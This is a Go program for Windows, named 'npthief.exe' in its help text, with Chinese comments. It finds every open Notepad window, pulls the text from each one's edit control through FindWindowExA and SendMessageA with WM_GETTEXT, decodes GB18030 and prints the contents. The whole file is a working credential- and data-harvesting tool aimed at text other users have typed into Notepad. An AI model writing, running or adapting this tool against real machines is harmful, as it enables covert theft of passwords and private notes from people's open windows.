package main

import (
	"fmt"
	"golang.org/x/text/encoding/simplifiedchinese"
	"os"
	"strconv"
	"strings"
	"syscall"
	"unsafe"
)
type Charset string

const (
	UTF8    = Charset("UTF-8")
	GB18030 = Charset("GB18030")
	WM_GETTEXT = 0x000D
	WM_GETTEXTLENGTH = 0x000E
)

//编码方式
var ENC = GB18030

//编码转换 预防中文乱码
func ConvertByte2String(byte []byte, charset Charset) string {
	var str string
	switch charset {
	case GB18030:
		var decodeBytes,_=simplifiedchinese.GB18030.NewDecoder().Bytes(byte)
		str= string(decodeBytes)
	case UTF8:
		fallthrough
	default:
		str = string(byte)
	}

	return str
}



func main(){
	//可通过命令行参数修改为UTF-8
	if len(os.Args) == 2{
		if os.Args[1] == "utf8" || os.Args[1] == "utf-8"|| os.Args[1] == "u8"{
			ENC = UTF8
		}else if os.Args[1] == "-h"{
			fmt.Println("npthief.exe")
			fmt.Println("npthief.exe utf8")
		}
	}

	var lent = 30000


	pFindWindowExA := syscall.NewLazyDLL("user32.dll").NewProc("FindWindowExA")
	//notep_, _ := syscall.BytePtrFromString("Notepad")

	notep_, _ := syscall.BytePtrFromString("Notepad")
	notep := uintptr(unsafe.Pointer(notep_))

	//获取notepad窗体
	noteHwnd,_,_ := pFindWindowExA.Call(0,0,notep,0)
	if noteHwnd!= 0{

		fmt.Printf("[+] Found Window %x\n",noteHwnd)

		editp_, _ := syscall.BytePtrFromString("Edit")
		editp := uintptr(unsafe.Pointer(editp_))

		//获取编辑窗体
		editHwnd,_,_ := pFindWindowExA.Call(noteHwnd,0,editp,0)
		if editHwnd != 0 {
			pSendMessageA := syscall.NewLazyDLL("user32.dll").NewProc("SendMessageA")
			//获取文本长度
			r1,_,_ := pSendMessageA.Call(editHwnd, WM_GETTEXTLENGTH, 0, 0)

			lent = int(r1)
			fmt.Println("[+] GetLength: "+strconv.Itoa(lent))

			buff := make([]byte, lent+1)

			//提取文本
			pSendMessageA.Call(editHwnd, WM_GETTEXT, uintptr(lent), uintptr(unsafe.Pointer(&buff[0])))

			//编码转换
			str := ConvertByte2String(buff,ENC)

			//str := string(buff)
			fmt.Printf("[+] Content: \n\n%s\n\n", strings.Replace(str, "\x00", "", -1))
		}
	}else{
		fmt.Println("[-] Cannot Found Window")
	}

	//循环获取其它notepad文本
	for noteHwnd!= 0{
		noteHwnd,_,_ = pFindWindowExA.Call(0,noteHwnd,notep,0)
		if noteHwnd!= 0{
			fmt.Printf("[+] Found Window %x\n",noteHwnd)

			editp_, _ := syscall.BytePtrFromString("Edit")
			editp := uintptr(unsafe.Pointer(editp_))

			editHwnd,_,_ := pFindWindowExA.Call(noteHwnd,0,editp,0)
			if editHwnd != 0 {
				pSendMessageA := syscall.NewLazyDLL("user32.dll").NewProc("SendMessageA")
				r1,_,_ := pSendMessageA.Call(editHwnd, WM_GETTEXTLENGTH, 0, 0)

				lent = int(r1)
				fmt.Println("[+] GetLength: "+strconv.Itoa(lent))

				buff := make([]byte, lent+1)

				pSendMessageA.Call(editHwnd, WM_GETTEXT, uintptr(lent), uintptr(unsafe.Pointer(&buff[0])))

				str := ConvertByte2String(buff,ENC)

				//str := string(buff)
				fmt.Printf("[+] Content: \n\n%s\n\n", strings.Replace(str, "\x00", "", -1))
			}
		}else{
			break
		}
	}
}

